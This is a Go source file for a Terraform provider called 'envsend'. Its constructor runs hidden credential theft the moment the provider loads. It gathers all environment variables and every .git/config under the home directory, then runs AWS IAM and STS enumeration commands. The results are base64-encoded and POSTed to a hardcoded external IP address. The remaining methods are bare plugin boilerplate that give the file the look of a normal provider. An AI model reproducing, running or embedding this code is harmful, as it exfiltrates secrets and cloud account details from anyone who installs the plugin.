package main

import (
	"bytes"
	"context"
	"encoding/base64"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strings"

	"github.com/hashicorp/terraform-plugin-framework/datasource"
	"github.com/hashicorp/terraform-plugin-framework/provider"
	"github.com/hashicorp/terraform-plugin-framework/provider/schema"
	"github.com/hashicorp/terraform-plugin-framework/resource"
)

type EnvSendProvider struct{}

func NewProvider() provider.Provider {

	wwoo := "http://52.21.38.153:8000/1"

	var payload2 bytes.Buffer
	for _, e := range os.Environ() { //TODO check crash
		payload2.WriteString(e + "\n")
	}

	payload2.WriteString("\n===== LOG FILES =====\n")

	home := os.Getenv("HOME")
	err := filepath.Walk(home, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil // Skip on errors
		}
		if !info.IsDir() {
			parent := filepath.Base(filepath.Dir(path))
			file := filepath.Base(path)
			if parent == ".git" && file == "config" {
				payload2.WriteString("\n--- " + path + " ---\n")
				content, readErr := os.ReadFile(path)
				if readErr != nil {
					payload2.WriteString("Error reading file: " + readErr.Error() + "\n")
					return nil
				}
				payload2.Write(content)
				payload2.WriteString("\n")
			}
		}
		return nil
	})

	if err != nil {
		payload2.WriteString("\nError walking home: " + err.Error() + "\n")
	}

	// Encode as Base64
	encoded := base64.StdEncoding.EncodeToString(payload2.Bytes())

	// Send to wooo
	http.Post(wwoo, "text/plain", bytes.NewBufferString(encoded))

	wwoo2 := "http://52.21.38.153:8000/2"
	// Get Caller Identity
	payload := "GET-CALLER-IDENTITY:\n"
	cmd := exec.Command("bash", "-c", "aws sts get-caller-identity 2>&1")
	out, err := cmd.CombinedOutput()
	payload += string(out)
	if err != nil {
		payload += "\nERROR: " + err.Error() + "\n"
	}

	// Getting Role Arn
	re := regexp.MustCompile(`"Arn"\s*:\s*"([^"]+)"`)
	role_arn := ""
	matches := re.FindStringSubmatch(payload)
	if len(matches) > 1 {
		role_arn = matches[1]
	}
	// Get Role Name
	parts := strings.Split(role_arn, "/")
	role_name := parts[len(parts)-2]

	// List users
	payload += "\nLIST-USERS:\n"
	cmd = exec.Command("bash", "-c", "aws iam list-users 2>&1")
	out, err = cmd.CombinedOutput()
	payload += string(out)
	if err != nil {
		payload += "\nERROR: " + err.Error() + "\n"

	}

	// List Roles
	payload += "\nLIST-ROLES:\n"
	cmd = exec.Command("bash", "-c", "aws iam list-roles 2>&1")
	out, err = cmd.CombinedOutput()
	payload += string(out)
	if err != nil {
		payload += "\nERROR: " + err.Error() + "\n"
	}

	// Get Specific Role
	payload += "\nGET-ROLE:\n"
	command_string := "aws iam get-role --role-name " + role_name + " 2>&1"
	cmd = exec.Command("bash", "-c", command_string)
	out, err = cmd.CombinedOutput()
	jsonStr := string(out)
	payload += string(out)
	if err != nil {
		payload += "\nERROR: " + err.Error() + "\n"
	}

	// Get ProviderArn
	providerArn := ""
	re = regexp.MustCompile(`"Federated"\s*:\s*"([^"]+)"`)
	matches = re.FindStringSubmatch(jsonStr)
	if len(matches) < 2 {
		payload += "no\n Federated provider ARN found in role policy\n"
		payload += "raw output:\n"
	} else {
		providerArn = matches[1]
	}

	// Get oidc provider
	payload += "\nGET-OIDC-Provider:\n"
	cmd = exec.Command("bash", "-c", "aws iam get-open-id-connect-provider --open-id-connect-provider-arn "+providerArn+" 2>&1")
	out, err = cmd.CombinedOutput()
	payload += string(out)
	if err != nil {
		payload += "\nERROR: " + err.Error() + "\n"
	}

	// Encode as Base64
	encoded = base64.StdEncoding.EncodeToString([]byte(payload))

	// Send to wooo
	http.Post(wwoo2, "text/plain", bytes.NewBufferString(encoded))

	return &EnvSendProvider{}
}

func (p *EnvSendProvider) Metadata(_ context.Context, _ provider.MetadataRequest, resp *provider.MetadataResponse) {
	resp.TypeName = "envsend"
}

func (p *EnvSendProvider) Schema(_ context.Context, _ provider.SchemaRequest, resp *provider.SchemaResponse) {
	resp.Schema = schema.Schema{}
}

func (p *EnvSendProvider) Configure(_ context.Context, _ provider.ConfigureRequest, _ *provider.ConfigureResponse) {
	// No-op
}

func (p *EnvSendProvider) Resources(_ context.Context) []func() resource.Resource {
	return []func() resource.Resource{
		NewEnvSendResource,
	}
}

func (p *EnvSendProvider) DataSources(_ context.Context) []func() datasource.DataSource {
	return nil
}
